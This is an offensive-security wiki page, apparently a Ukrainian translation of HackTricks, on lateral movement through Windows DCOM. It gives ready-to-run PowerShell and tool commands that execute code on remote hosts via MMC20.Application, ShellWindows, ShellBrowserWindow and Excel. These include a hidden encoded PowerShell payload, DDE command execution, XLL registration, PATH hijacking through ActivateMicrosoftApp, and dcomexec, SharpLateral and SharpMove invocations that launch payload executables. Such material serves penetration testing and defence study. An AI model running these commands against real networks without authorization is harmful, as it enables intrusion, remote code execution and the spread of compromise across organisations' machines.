# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement є привабливим, оскільки повторно використовує наявні COM servers, доступні через RPC/DCOM, замість створення service або scheduled task. На практиці це означає, що початкове підключення зазвичай починається через TCP/135, а потім переходить до динамічно призначених високих RPC-портів.

## Передумови та важливі нюанси

- Зазвичай потрібен контекст локального адміністратора на target, а remote COM server має дозволяти remote launch/activation.
- Починаючи з **14 березня 2023 року**, Microsoft застосовує DCOM hardening для supported systems. Старі клієнти, які запитують низький рівень authentication для activation, можуть завершуватися помилкою, якщо не узгодять щонайменше `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Сучасні Windows clients зазвичай автоматично підвищують цей рівень, тому current tooling зазвичай продовжує працювати.<sup>[[3]](#references)</sup>
- Для ручного або scripted DCOM execution зазвичай потрібні TCP/135 і dynamic RPC port range target. Якщо ви використовуєте Impacket's `dcomexec.py` і хочете отримувати command output, зазвичай також потрібен SMB access до `ADMIN$` (або іншого writable/readable share).
- Якщо RPC/DCOM працює, але SMB заблокований, `dcomexec.py -nooutput` усе одно може бути корисним для blind execution.

Швидкі перевірки:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Детальніше про цю техніку дивіться в оригінальному дописі [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**<sup>[[1]](#references)</sup>

Об'єкти Distributed Component Object Model (DCOM) надають цікаві можливості для взаємодії з об'єктами через мережу. Microsoft надає вичерпну документацію щодо DCOM і Component Object Model (COM), доступну [тут для DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) і [тут для COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Список DCOM applications можна отримати за допомогою команди PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Об'єкт COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), дає змогу створювати скрипти для операцій оснасток MMC. Примітно, що цей об'єкт містить метод `ExecuteShellCommand` у `Document.ActiveView`. Додаткову інформацію про цей метод можна знайти [тут](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Перевірте його запуск:<sup>[[6]](#references)</sup>

Ця функція дає змогу виконувати команди через мережу за допомогою DCOM application. Щоб віддалено взаємодіяти з DCOM як адміністратор, можна використати PowerShell:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Ця команда підключається до DCOM application і повертає екземпляр COM object. Потім можна викликати метод ExecuteShellCommand для виконання process на віддаленому хості. Процес складається з таких кроків:

Перевірка методів:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Отримання RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Останній аргумент — це стиль вікна. `7` залишає вікно згорнутим. З операційної точки зору, виконання на основі MMC зазвичай призводить до того, що віддалений процес `mmc.exe` запускає ваш payload, що відрізняється від об’єктів на основі Explorer, описаних нижче.

## ShellWindows & ShellBrowserWindow

**Щоб дізнатися більше про цю техніку, перегляньте оригінальний допис [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Було встановлено, що об’єкту **MMC20.Application** бракує явних `"LaunchPermissions"`, тому за замовчуванням використовуються дозволи, які надають доступ Administrators. Докладніше це питання розглянуто [тут](https://twitter.com/tiraniddo/status/817532039771525120), а для фільтрації об’єктів без явного Launch Permission рекомендується використовувати OleView .NET від [@tiraniddo](https://twitter.com/tiraniddo).

Два конкретні об’єкти, `ShellBrowserWindow` і `ShellWindows`, були виділені через відсутність явних Launch Permissions. Відсутність запису реєстру `LaunchPermission` у `HKCR:\AppID\{guid}` означає відсутність явних дозволів.

Порівняно з `MMC20.Application`, ці об’єкти часто є менш помітними з точки зору OPSEC, оскільки команда на віддаленому хості зазвичай стає дочірнім процесом `explorer.exe`, а не `mmc.exe`.

### ShellWindows

Для `ShellWindows`, який не має ProgID, методи .NET `Type.GetTypeFromCLSID` і `Activator.CreateInstance` спрощують створення екземпляра об’єкта за допомогою його AppID. У цьому процесі використовується OleView .NET для отримання CLSID `ShellWindows`. Після створення екземпляра взаємодія можлива через метод `WindowsShell.Item`, що дає змогу викликати метод на кшталт `Document.Application.ShellExecute`.

Нижче наведено приклади команд PowerShell для створення екземпляра об’єкта та віддаленого виконання команд:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` подібний, але його можна безпосередньо створити за допомогою його CLSID і виконати pivot до `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement за допомогою Excel DCOM Objects

Lateral movement можна здійснити шляхом експлуатації DCOM-об'єктів Excel. Для отримання детальної інформації рекомендується ознайомитися з обговоренням використання Excel DDE для lateral movement через DCOM у [блозі Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).<sup>[[5]](#references)</sup>

Проєкт Empire містить PowerShell-скрипт, який демонструє використання Excel для віддаленого виконання коду (RCE) шляхом маніпулювання DCOM-об'єктами. Нижче наведено фрагменти скрипта, доступного в [GitHub-репозиторії Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), які демонструють різні методи зловживання Excel для RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Нещодавні дослідження розширили цю область завдяки методу `Excel.Application` `ActivateMicrosoftApp()`. Ключова ідея полягає в тому, що Excel може спробувати запустити застарілі Microsoft applications, такі як FoxPro, Schedule Plus або Project, здійснюючи пошук у системному `PATH`. Якщо operator може розмістити payload з одним із очікуваних імен у доступному для запису каталозі, який входить до `PATH` target, Excel виконає його.<sup>[[4]](#references)</sup>

Вимоги для цього варіанта:

- Local admin на target
- Excel встановлений на target
- Можливість записати payload у доступний для запису каталог у `PATH` target

Практичний приклад використання пошуку FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Якщо на атакуючому хості не зареєстровано локальний `Excel.Application` ProgID, натомість створіть віддалений об’єкт за CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Значення, які на практиці використовувалися зловмисниками:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Automation Tools for Lateral Movement

Нижче наведено два інструменти для автоматизації цих технік:

- **Invoke-DCOM.ps1**: PowerShell-скрипт, наданий проєктом Empire, який спрощує виклик різних методів для виконання code на віддалених машинах. Цей скрипт доступний у GitHub-репозиторії Empire.

- **SharpLateral**: інструмент, призначений для віддаленого виконання code, який можна використовувати за допомогою команди:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell-скрипт [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) дає змогу легко викликати всі описані способи виконання code на інших машинах.
- Ви можете використовувати `dcomexec.py` з Impacket для виконання команд у віддалених системах за допомогою DCOM. Поточні збірки підтримують `ShellWindows`, `ShellBrowserWindow` і `MMC20`, а за замовчуванням використовується `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Також можна використовувати [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Ви також можете використати [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Посилання

- [1] [Lateral Movement за допомогою COM-об'єкта MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement через DCOM: раунд 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — керування змінами для обходу функції безпеки Windows DCOM Server (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: зловживання можливостями DCOM Excel Application](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Використання Excel DDE для lateral movement через DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com — клас MMC Application (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)

{{#include ../../banners/hacktricks-training.md}}
